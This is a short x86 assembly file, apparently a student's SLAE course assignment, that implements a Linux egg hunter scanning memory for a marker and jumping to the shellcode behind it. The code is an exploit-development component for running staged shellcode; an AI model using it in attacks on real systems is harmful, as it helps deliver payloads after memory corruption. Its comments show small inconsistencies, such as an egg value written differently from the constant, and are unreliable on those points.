; SLAE - Assignment #3: Egg Hunter shellcode (Linux/x86)
; Author: Alain Menelet 
; StudentID - SLAE-3763
; Tested on Ubuntu 16.14.03 LTS

global _start

section .text

_start:
	jmp short valid

validAddress:
	
	pop eax			    		; eax contains a valid address
	mov ebx, 0x3fb33fb3	    	; egg key b33fb33f

_:
	inc eax			    		; increase memory
	cmp dword [eax], ebx        ; compare with the key
	jne _                       ; loop if dfferent
	jmp eax                     ; if equal jump to shellcode


valid:
	call validAddress			; jump pop call technique to take a valid address